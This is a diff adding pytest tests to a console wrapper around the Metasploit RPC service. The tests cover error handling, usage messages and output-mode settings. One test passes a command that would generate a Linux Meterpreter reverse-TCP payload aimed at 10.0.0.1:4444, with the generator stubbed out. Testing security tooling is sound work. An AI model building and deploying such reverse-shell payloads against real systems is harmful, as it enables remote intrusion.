@@ -67,3 +67,47 @@ def test_unknown_command(console):
     out, keep, action = console.dispatch("frobnicate")
     assert "unknown" in out.lower()
     assert keep is True
+
+
+def test_dispatch_catches_handler_rpc_error(console, monkeypatch):
+    def boom(client):
+        raise ryotenkai.MsfRpcError("down")
+    monkeypatch.setattr(ryotenkai, "get_jobs", boom)
+    out, keep, action = console.dispatch("jobs")
+    assert "rpc error" in out.lower()
+    assert keep is True
+
+
+def test_dispatch_catches_generic_error(console, monkeypatch):
+    def boom(client):
+        raise ValueError("boom")
+    monkeypatch.setattr(ryotenkai, "get_jobs", boom)
+    out, keep, action = console.dispatch("jobs")
+    assert out.lower().startswith("[!] error")
+    assert keep is True
+
+
+def test_generate_success(console, monkeypatch):
+    seen = {}
+
+    def fake_gen(*a):
+        seen["args"] = a
+        return {"status": "success", "message": "Payload saved to out.elf"}
+
+    monkeypatch.setattr(ryotenkai, "generate_payload", fake_gen)
+    out, keep, action = console.dispatch(
+        "generate elf linux/x64/meterpreter/reverse_tcp 10.0.0.1 4444 out.elf")
+    assert seen["args"] == ("elf", "linux/x64/meterpreter/reverse_tcp",
+                            "10.0.0.1", "4444", "out.elf")
+    assert "Payload saved" in out
+
+
+def test_generate_usage_error(console):
+    out, keep, action = console.dispatch("generate elf p 1")
+    assert "usage" in out.lower()
+
+
+def test_set_output_invalid(console):
+    out, keep, action = console.dispatch("set output xml")
+    assert "json or table" in out
+    assert console.output_mode == "table"
